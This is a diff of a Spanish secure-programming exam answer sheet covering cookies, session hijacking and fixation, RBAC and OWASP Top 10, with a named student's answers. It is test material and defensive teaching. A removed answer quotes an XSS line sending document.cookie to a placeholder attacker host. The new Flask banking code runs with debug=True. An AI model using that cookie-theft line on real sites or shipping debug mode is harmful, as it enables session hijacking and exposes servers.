@@ -6,7 +6,7 @@
 | **Curso** | Programación Segura (DD281) — Semana 3 |
 | **Nombre del estudiante** | JESUS ANTONIO TOLENTINO VARGAS |
 | **Código** | 2221896125 |
-| **Fecha de entrega** | 20/06/2026 |
+| **Fecha de entrega** | _____________ |
 | **Tiempo estimado** | 1.5 horas |
 | **Puntaje total** | 100 puntos |
 
@@ -47,7 +47,7 @@ HTTP es un protocolo "sin estado" (stateless). Esto significa que:
 - c) Cookie con atributos `HttpOnly` y `Secure`
 - d) Variable global de JavaScript en el cliente
 
-**Respuesta: [ c ]**
+**Respuesta: [ c  ]**
 
 ---
 
@@ -59,7 +59,7 @@ El atributo `HttpOnly` en una cookie:
 - c) Limita la cookie a peticiones del mismo dominio únicamente
 - d) Establece la fecha de expiración automática de la cookie
 
-**Respuesta: [ b ]**
+**Respuesta: [  b ]**
 
 ---
 
@@ -71,7 +71,7 @@ El atributo `Secure` en una cookie garantiza que:
 - c) JavaScript no puede acceder al valor de la cookie
 - d) La cookie expira automáticamente al cerrar el navegador
 
-**Respuesta: [ b ]**
+**Respuesta: [  b ]**
 
 ---
 
@@ -107,7 +107,7 @@ En el ataque Session Fixation, el atacante:
 - c) Inyecta código JavaScript para robar la cookie del usuario
 - d) Intercepta el tráfico de red para capturar el session ID
 
-**Respuesta: [ b ]**
+**Respuesta: [ b]**
 
 ---
 
@@ -151,34 +151,34 @@ Un navegador moderno recibe `Set-Cookie: session=abc; SameSite=None` sin el atri
 
 ### B1 — Completar espacios en blanco (10 puntos — 2 pts c/u)
 
-Banco: `HttpOnly` / `session.clear()` / `servidor` / `Secure` / `RBAC` / `SameSite` / `session_id` / `stateless`
+Usa las palabras del banco: `HttpOnly` / `session.clear()` / `servidor` / `Secure` / `RBAC` / `SameSite` / `session_id` / `stateless`
 
-1. HTTP es un protocolo **stateless** porque no recuerda peticiones anteriores entre cliente y servidor.
+1. HTTP es un protocolo stateless porque no recuerda peticiones anteriores entre cliente y servidor.
 
-2. El atributo **Secure** garantiza que la cookie de sesión no sea transmitida sobre conexiones HTTP no cifradas.
+2. El atributo Secure garantiza que la cookie de sesión no sea transmitida sobre conexiones HTTP no cifradas.
 
-3. El modelo de control de acceso **RBAC** asigna permisos a través de roles, no directamente a usuarios individuales.
+3. El modelo de control de acceso RBAC asigna permisos a través de roles, no directamente a usuarios individuales.
 
-4. En un logout correcto, además de eliminar la cookie del cliente, el **servidor** debe invalidar el session ID en su propio almacén.
+4. En un logout correcto, además de eliminar la cookie del cliente, el servidor debe invalidar el session ID en su propio almacén.
 
-5. Para prevenir Session Fixation, después de una autenticación exitosa se debe ejecutar **session.clear()** para limpiar la sesión previa.
+5. Para prevenir Session Fixation, después de una autenticación exitosa se debe ejecutar session.clear() para limpiar la sesión previa.
 
 ---
 
 ### B2 — Relacionar columnas (10 puntos)
 
+Relaciona cada atributo/concepto (columna A) con su descripción correcta (columna B).
+
 | Columna A | | Columna B |
 |---|---|---|
-| 1. `HttpOnly` | **c** | a) Controla si la cookie se envía en peticiones cross-site |
-| 2. `Secure` | **f** | b) El servidor no puede recordar peticiones anteriores |
-| 3. `SameSite=Lax` | **a** | c) Previene que JavaScript lea el valor de la cookie |
-| 4. Session Hijacking | **e** | d) El atacante forza un session ID conocido antes del login |
-| 5. Session Fixation | **d** | e) Robo de un session ID válido para suplantar al usuario |
-| 6. Stateless | **b** | f) La cookie solo viaja sobre conexiones HTTPS |
-| 7. Mínimo Privilegio | **h** | g) Conjunto de permisos asignados a un tipo de usuario |
-| 8. Rol | **g** | h) Cada usuario tiene solo los permisos que necesita |
-
-**Resumen:** 1→c, 2→f, 3→a, 4→e, 5→d, 6→b, 7→h, 8→g
+| 1. `HttpOnly` -> c | a) Controla si la cookie se envía en peticiones cross-site |
+| 2. `Secure` -> f| b) El servidor no puede recordar peticiones anteriores |
+| 3. `SameSite=Lax` -> a_____ | c) Previene que JavaScript lea el valor de la cookie |
+| 4. Session Hijacking-> e _____ | d) El atacante forza un session ID conocido antes del login |
+| 5. Session Fixation -> d _____ | e) Robo de un session ID válido para suplantar al usuario |
+| 6. Stateless -> b _____ | f) La cookie solo viaja sobre conexiones HTTPS |
+| 7. Mínimo Privilegio -> h _____ | g) Conjunto de permisos asignados a un tipo de usuario |
+| 8. Rol -> g _____ | h) Cada usuario tiene solo los permisos que necesita |
 
 ---
 
@@ -189,173 +189,254 @@ Banco: `HttpOnly` / `session.clear()` / `servidor` / `Secure` / `RBAC` / `SameSi
 ---
 
 **Pregunta C1 (10 puntos)**
+Un compañero propone guardar el session ID del usuario en `localStorage` porque "es más fácil acceder a él desde JavaScript". Explica por qué esta decisión es un riesgo de seguridad y cuál sería la alternativa correcta con sus fundamentos técnicos.
 
 *Tu respuesta:*
 
-Guardar el session ID en `localStorage` es un riesgo porque ese almacenamiento es accesible desde JavaScript mediante `localStorage.getItem()`, de modo que cualquier vulnerabilidad XSS permitiría a un atacante leer el identificador y robar la sesión. Además, `localStorage` no ofrece los mecanismos de protección de una cookie (no tiene `HttpOnly`, `Secure` ni `SameSite`) y persiste incluso tras cerrar la pestaña. La alternativa correcta es almacenar el session ID en una **cookie con `HttpOnly`** (para que JavaScript no pueda leerla, neutralizando el robo por XSS), **`Secure`** (para que solo viaje por HTTPS) y **`SameSite`** (para mitigar CSRF). Así el manejo de la sesión queda del lado del navegador y del servidor, no expuesto al script de la página.
+Guardar el session ID en localStorage no es seguro porque puede ser leído por código JavaScript ejecutado en el navegador. Si la página tuviera una vulnerabilidad XSS, un atacante podría capturar ese identificador y usarlo para entrar como si fuera el usuario legítimo. La opción más segura es usar una cookie de sesión con atributos como HttpOnly, Secure y SameSite. De esa forma, JavaScript no puede leer la cookie, esta solo viaja por HTTPS y se reduce el riesgo de ataques CSRF.
 
 ---
 
 **Pregunta C2 (10 puntos)**
+Compara el ataque **Session Hijacking** con el ataque **Session Fixation**: en qué se diferencian en su mecánica, qué tienen en común en su objetivo final, y cuál es la medida técnica específica que previene cada uno.
 
 *Tu respuesta:*
 
-En el **Session Hijacking** el atacante **roba un session ID válido ya existente** —típicamente mediante XSS, sniffing de red o acceso físico— después de que la víctima inició sesión, y lo reutiliza para suplantarla. En el **Session Fixation** la mecánica es inversa: el atacante **fija o impone un session ID que él ya conoce** en el navegador de la víctima **antes** del login, y cuando esta se autentica sobre ese mismo identificador, el atacante puede reusarlo. Ambos comparten el mismo objetivo final: **suplantar la sesión de la víctima** sin conocer su contraseña. La medida que previene el hijacking es proteger el token con `HttpOnly`, `Secure` y TLS para que no pueda robarse; la que previene la fixation es **regenerar el session ID tras el login** (en Flask, `session.clear()` antes de asignar los datos), de modo que el identificador previo quede inservible.
+El Session Hijacking ocurre cuando un atacante roba una sesión válida que ya fue iniciada por el usuario, por ejemplo mediante XSS o interceptación de tráfico. En cambio, el Session Fixation sucede cuando el atacante logra que la víctima use un identificador de sesión conocido antes de iniciar sesión. Ambos ataques buscan lo mismo: suplantar al usuario sin conocer su contraseña. Para prevenir hijacking se deben proteger las cookies con HttpOnly, Secure y HTTPS; para prevenir fixation se debe regenerar o limpiar la sesión después del login, por ejemplo usando session.clear().
 
 ---
 
-**Mini caso de análisis — RetailFácil**
+**Mini caso de análisis — Para preguntas C3a y C3b**
+
+> El equipo de desarrollo de **RetailFácil** (una tienda online peruana) implementó el siguiente sistema de autenticación:
+>
+> - Al hacer login, el servidor crea una cookie: `Set-Cookie: uid=456; role=comprador; Path=/`
+> - Los precios se envían como campos ocultos en el formulario: `<input type="hidden" name="precio" value="299.00">`
+> - Al hacer clic en "pagar", el backend lee `request.form['precio']` y procesa ese valor como el precio real
+> - La sesión no tiene tiempo de expiración configurado
 
 **Pregunta C3a (5 puntos)**
+Identifica los problemas de seguridad presentes en el diseño de RetailFácil y explica cómo cada uno podría ser explotado por un atacante.
 
 *Tu respuesta:*
 
-El diseño expone el **rol y el uid en una cookie de texto plano** (`role=comprador; uid=456`): el usuario puede editarla con DevTools y cambiarla a `role=admin` o a otro `uid`, logrando **parameter tampering** y suplantación. El **precio enviado como campo oculto** y leído tal cual por el backend permite **manipular el precio** (`precio=1.00`) y pagar mucho menos de lo real. Y la **ausencia de expiración de sesión** mantiene válida indefinidamente cualquier cookie capturada o abandonada, ampliando la ventana para un secuestro de sesión.
+El diseño de RetailFácil presenta varios problemas porque confía en datos enviados desde el cliente. El rol y el uid están dentro de una cookie que el usuario podría modificar desde el navegador, cambiando por ejemplo su rol de comprador a administrador. También es inseguro enviar el precio como campo oculto, porque un atacante puede modificarlo antes de pagar. Además, al no existir tiempo de expiración, una sesión robada podría seguir siendo utilizada por mucho tiempo.
 
 **Pregunta C3b (5 puntos)**
+Propón cómo debería reimplementarse este sistema de manera segura, explicando el principio de seguridad que aplica en cada corrección.
 
 *Tu respuesta:*
 
-El rol y el uid deben guardarse **del lado del servidor** en la sesión firmada (en Flask, `session`), nunca en una cookie editable por el cliente, aplicando el principio de **no confiar en el cliente / autoridad en el servidor**. El **precio debe calcularse y validarse en el servidor** a partir del ID del producto consultado en la base de datos, ignorando cualquier valor enviado por el formulario, aplicando **validación del lado del servidor / nunca confiar en la entrada**. La cookie de sesión debe llevar `HttpOnly`, `Secure` y `SameSite` (**protección del token de sesión**), y la sesión debe tener **timeout de expiración** (gestión de sesiones / minimizar la ventana de exposición).
+El sistema debería guardar el rol y el identificador del usuario del lado del servidor, no en una cookie manipulable por el cliente. El precio del producto debe obtenerse desde la base de datos según el producto seleccionado, ignorando cualquier precio enviado desde el formulario. También se debe configurar la cookie con HttpOnly, Secure y SameSite, además de establecer un tiempo de expiración de sesión. Estas correcciones aplican el principio de no confiar en el cliente y el principio de mínimo privilegio.
 
 ---
 
 ## SECCIÓN D — PREGUNTAS AVANZADAS Y DE CASO (30 puntos)
 
-### Caso profesional — SaludNet Perú (15 puntos)
+---
+
+### Caso profesional (15 puntos)
+
+> **SaludNet Perú** es una startup de telemedicina que permite a pacientes ver sus resultados de laboratorio y a médicos acceder a historias clínicas. El sistema usa una cookie de sesión sin `HttpOnly` ni `Secure`. El sistema tiene tres tipos de usuarios: paciente, médico y administrador.
+>
+> Un auditor de seguridad detectó que un médico puede acceder a la historia clínica de cualquier paciente simplemente cambiando el parámetro en la URL: `/historia?paciente_id=1023` → `/historia?paciente_id=1024`. También encontró que la cookie de sesión puede leerse con JavaScript y que el sistema funciona sobre HTTP sin redirigir a HTTPS.
 
 **Pregunta D1 (5 puntos)**
+¿Qué vulnerabilidades del OWASP Top 10 están presentes en SaludNet Perú? Nómbralas por su código y nombre, y explica brevemente cómo se manifiesta cada una en el caso.
 
 *Tu respuesta:*
 
-Están presentes **A01:2021 — Broken Access Control**, que se manifiesta como un **IDOR**: un médico cambia `paciente_id=1023` por `1024` en la URL y accede a historias clínicas que no le corresponden, porque el servidor no verifica la propiedad/autorización del recurso. **A02:2021 — Cryptographic Failures**, porque el sistema opera sobre **HTTP sin cifrar** y la cookie no tiene `Secure`, exponiendo datos de salud sensibles en tránsito. Y **A07:2021 — Identification and Authentication Failures**, porque la cookie de sesión **sin `HttpOnly` ni `Secure`** es robable (por XSS o sniffing), permitiendo suplantar usuarios. De forma complementaria, hay **A05:2021 — Security Misconfiguration** por no redirigir HTTP a HTTPS y por la configuración insegura de cookies.
+En SaludNet Perú se observa A01:2021 Broken Access Control, porque un médico puede acceder a historias clínicas de pacientes no asignados cambiando el parámetro paciente_id en la URL. También aparece A02:2021 Cryptographic Failures, ya que el sistema funciona por HTTP y expone información sensible sin cifrado. Además, existe A07:2021 Identification and Authentication Failures, porque la cookie de sesión no tiene HttpOnly ni Secure, permitiendo que pueda ser robada o reutilizada. También puede considerarse una mala configuración de seguridad por no forzar HTTPS.
+
 
 **Pregunta D2 (5 puntos)**
+Diseña el esquema RBAC completo para SaludNet Perú: define los roles necesarios y los permisos específicos de cada uno. Luego escribe el pseudocódigo o código Python del decorador que verificaría el acceso antes de mostrar una historia clínica.
 
 *Tu respuesta:*
 
-**Roles y permisos:**
-- **Paciente:** solo puede ver **sus propios** resultados de laboratorio.
-- **Médico:** puede ver historias clínicas **únicamente de los pacientes asignados** a él.
-- **Administrador:** gestiona usuarios y configuración; no accede a historias clínicas salvo para auditoría controlada.
-
-La clave del decorador es verificar **rol + propiedad del recurso** (esto corrige el IDOR), no solo el rol:
+El sistema debe manejar tres roles principales. El paciente solo debe acceder a sus propios resultados e historia clínica. El médico debe acceder únicamente a los pacientes que tiene asignados. El administrador puede gestionar usuarios y configuraciones, pero el acceso a historias clínicas debe estar controlado y auditado. El decorador debe validar tanto el rol como la relación entre el usuario y el recurso solicitado.
 
 ```python
 from functools import wraps
 from flask import session, redirect, url_for, abort
 
-def require_acceso_historia(f):
+
+def require_historia_access(f):
+    """
+    Decorador que controla el acceso a la historia clínica de un paciente.
+
+    Reglas:
+    - Paciente: solo puede acceder a su propia historia clínica.
+    - Médico: solo puede acceder a las historias de sus pacientes asignados.
+    - Administrador: acceso total.
+    """
+
     @wraps(f)
     def inner(paciente_id, *args, **kwargs):
-        # 1. ¿Autenticado?
-        if 'user_id' not in session:
-            return redirect(url_for('login'))
-        rol = session.get('user_role')
-        uid = session.get('user_id')
-        # 2. Autorización por rol + propiedad del recurso
-        if rol == 'paciente' and paciente_id != uid:
-            abort(403)                      # un paciente solo ve lo suyo
-        elif rol == 'medico' and paciente_id not in pacientes_asignados(uid):
-            abort(403)                      # médico solo ve sus pacientes
-        elif rol not in ('paciente', 'medico', 'admin'):
+        # Verificar autenticación
+        if "user_id" not in session:
+            return redirect(url_for("login"))
+
+        rol = session.get("user_role")
+        user_id = session.get("user_id")
+
+        # Paciente: solo puede acceder a su propia historia
+        if rol == "paciente":
+            if str(paciente_id) != str(user_id):
+                abort(403)
+
+        # Médico: solo puede acceder a pacientes asignados
+        elif rol == "medico":
+            if paciente_id not in pacientes_asignados(user_id):
+                abort(403)
+
+        # Administrador: acceso completo
+        elif rol == "admin":
+            pass
+
+        # Cualquier otro rol no tiene acceso
+        else:
             abort(403)
+
         return f(paciente_id, *args, **kwargs)
+
     return inner
-```
+---
 
 **Pregunta D3 (5 puntos)**
+Si un médico puede leer la cookie de sesión de un paciente mediante una vulnerabilidad XSS, ¿cómo puede un atacante usar esa cookie para acceder al sistema como ese paciente? Describe el ataque paso a paso y qué atributo de cookie lo hubiera prevenido.
 
 *Tu respuesta:*
 
-Como la cookie no tiene `HttpOnly`, un script inyectado por XSS puede leerla con `document.cookie` y enviarla al servidor del atacante (por ejemplo, `new Image().src='http://atacante/?c='+document.cookie`). El atacante recibe el session ID válido del paciente, lo **inyecta en su propio navegador** (con DevTools o una extensión) y, al recargar el sitio de SaludNet, el servidor lo reconoce como ese paciente: ha realizado un **Session Hijacking** sin conocer la contraseña. El atributo que lo hubiera prevenido es **`HttpOnly`**, que impide que JavaScript acceda al valor de la cookie; junto con `Secure` para que no viaje por HTTP.
+Si existe una vulnerabilidad XSS y la cookie no tiene HttpOnly, un atacante puede ejecutar JavaScript para leer la cookie del paciente mediante document.cookie. Luego puede enviar ese valor a un servidor externo o copiarlo para usarlo en su propio navegador. Al colocar esa cookie robada, el sistema podría reconocer al atacante como si fuera el paciente autenticado. El atributo que ayuda a prevenir este robo es HttpOnly, porque impide que JavaScript lea el valor de la cookie.
 
 ---
 
 **Pregunta D4 — Diseño y propuesta (8 puntos)**
+> "¿Cómo implementarías la gestión de sesiones para un sistema bancario en Flask que debe cumplir estos requisitos: sesión que expira a los 15 minutos de inactividad, cookie segura contra XSS y CSRF, logout que invalide la sesión en el servidor, y RBAC con roles cliente/operador/admin?"
+
+Escribe el código Python/Flask completo que implementa esa gestión. Comenta cada decisión de seguridad.
 
 *Tu código:*
 
 ```python
-# Gestión de sesiones para un sistema bancario en Flask
 from flask import Flask, session, redirect, url_for, request, abort
 from functools import wraps
-from datetime import timedelta, datetime
+from datetime import datetime, timedelta
 import secrets
 
 app = Flask(__name__)
 
-# Clave de firma de la cookie de sesión: aleatoria y de alta entropía
-app.config['SECRET_KEY'] = secrets.token_hex(32)
+# Clave secreta fuerte para firmar la sesión
+app.config["SECRET_KEY"] = secrets.token_hex(32)
 
-# Cookie segura contra XSS y CSRF
+# Configuración segura de cookies
 app.config.update(
-    SESSION_COOKIE_HTTPONLY=True,     # JS no puede leer la cookie -> mitiga robo por XSS
-    SESSION_COOKIE_SECURE=True,       # la cookie solo viaja por HTTPS
-    SESSION_COOKIE_SAMESITE='Strict', # no se envía en peticiones cross-site -> mitiga CSRF
+    SESSION_COOKIE_HTTPONLY=True,      # Evita que JavaScript lea la cookie
+    SESSION_COOKIE_SECURE=True,        # Solo se envía por HTTPS
+    SESSION_COOKIE_SAMESITE="Strict",  # Reduce el riesgo de CSRF
+    PERMANENT_SESSION_LIFETIME=timedelta(minutes=15),
 )
-# Expiración absoluta de la sesión
-app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=15)
 
-def login_usuario(email, rol):
-    session.clear()                    # previene Session Fixation: nuevo ID tras autenticar
-    session['user_id']   = email
-    session['user_role'] = rol
-    session['last_activity'] = datetime.utcnow().isoformat()
-    session.permanent = True           # aplica PERMANENT_SESSION_LIFETIME
+
+def login_user(user_id, role):
+    """
+    Inicia sesión de forma segura.
+    Previene Session Fixation limpiando cualquier sesión previa.
+    """
+    session.clear()
+
+    session["user_id"] = user_id
+    session["user_role"] = role
+    session["last_activity"] = datetime.utcnow().isoformat()
+    session.permanent = True
+
 
 @app.before_request
-def control_inactividad():
-    # Timeout de 15 min por INACTIVIDAD (sliding): si pasó el límite, cerrar sesión
-    if 'user_id' in session:
-        ultima = session.get('last_activity')
-        if ultima:
-            inactivo = datetime.utcnow() - datetime.fromisoformat(ultima)
-            if inactivo > timedelta(minutes=15):
+def verificar_inactividad():
+    """
+    Verifica el tiempo de inactividad del usuario.
+    Si supera los 15 minutos, invalida la sesión.
+    """
+    if "user_id" in session:
+        ultima_actividad = session.get("last_activity")
+
+        if ultima_actividad:
+            tiempo_inactivo = (
+                datetime.utcnow() - datetime.fromisoformat(ultima_actividad)
+            )
+
+            if tiempo_inactivo > timedelta(minutes=15):
                 session.clear()
-                return redirect(url_for('login'))
-        session['last_activity'] = datetime.utcnow().isoformat()  # renovar actividad
+                return redirect(url_for("login"))
+
+        # Actualiza la última actividad
+        session["last_activity"] = datetime.utcnow().isoformat()
+
 
 def require_role(*roles):
+    """
+    Decorador para restringir acceso según el rol del usuario.
+    """
+
     def decorator(f):
         @wraps(f)
         def inner(*args, **kwargs):
-            if 'user_id' not in session:        # autenticación
-                return redirect(url_for('login'))
-            if session.get('user_role') not in roles:  # autorización (RBAC)
+            # Verifica autenticación
+            if "user_id" not in session:
+                return redirect(url_for("login"))
+
+            # Verifica autorización
+            if session.get("user_role") not in roles:
                 abort(403)
+
             return f(*args, **kwargs)
+
         return inner
+
     return decorator
 
-@app.route('/logout')
+
+@app.route("/logout")
 def logout():
-    session.clear()    # invalida la sesión en el SERVIDOR (no solo borra la cookie)
-    return redirect(url_for('login'))
+    """
+    Cierra la sesión eliminando toda la información almacenada.
+    """
+    session.clear()
+    return redirect(url_for("login"))
 
-# Ejemplos de RBAC con roles cliente / operador / admin
-@app.route('/transferir')
-@require_role('cliente')
-def transferir(): ...
 
-@app.route('/aprobar-operacion')
-@require_role('operador', 'admin')
-def aprobar(): ...
+@app.route("/cliente")
+@require_role("cliente")
+def panel_cliente():
+    return "Panel del cliente"
 
-@app.route('/gestion-usuarios')
-@require_role('admin')
-def gestion(): ...
-```
 
-*Nota: para CSRF, además de `SameSite=Strict`, en producción se añadiría un token CSRF por formulario (p. ej. Flask-WTF) en las operaciones POST sensibles como transferencias.*
+@app.route("/operador")
+@require_role("operador", "admin")
+def panel_operador():
+    return "Panel del operador"
+
+
+@app.route("/admin")
+@require_role("admin")
+def panel_admin():
+    return "Panel del administrador"
+
+
+if __name__ == "__main__":
+    app.run(debug=True)
 
 ---
 
 **Pregunta D5 — Pensamiento crítico (7 puntos)**
+> "¿Qué pasaría si un sistema implementa HttpOnly y Secure en las cookies, pero guarda el session ID con baja entropía (ej: un número secuencial como session_id=1001, 1002, 1003...)?"
+
+Explica el tipo de ataque que esto habilitaría, cómo lo ejecutaría un atacante, y cuál es el estándar correcto para generar session IDs seguros.
 
 *Tu respuesta:*
 
-Aunque `HttpOnly` y `Secure` impiden **robar** la cookie por XSS o por HTTP, no sirven de nada si el session ID es **predecible**: con identificadores secuenciales (`1001, 1002, 1003...`) se habilita un ataque de **predicción/enumeración de sesiones (session prediction)**. El atacante observa su propio ID, deduce el patrón y simplemente prueba valores cercanos (`1002`, `1004`, …) colocándolos como su cookie de sesión hasta caer en la sesión activa de otro usuario, suplantándolo sin necesidad de robar nada. El estándar correcto es generar los session IDs con un **generador criptográficamente seguro (CSPRNG)** y **alta entropía** —OWASP recomienda al menos 64 bits efectivos, idealmente 128— por ejemplo con `secrets.token_urlsafe(32)`/`secrets.token_hex(32)`. En Flask, como la sesión se firma con `SECRET_KEY`, esa clave debe ser aleatoria y de alta entropía para que el contenido no pueda falsificarse.
+Aunque una cookie tenga HttpOnly y Secure, el sistema sigue siendo vulnerable si el identificador de sesión es fácil de adivinar. Si los valores son secuenciales, como 1001, 1002 o 1003, un atacante podría probar números cercanos hasta encontrar una sesión activa. Este ataque se conoce como predicción de sesión o session prediction. La forma correcta de evitarlo es generar identificadores con alta entropía usando generadores criptográficamente seguros, de modo que sean aleatorios, largos y prácticamente imposibles de adivinar.
 
 ---
 
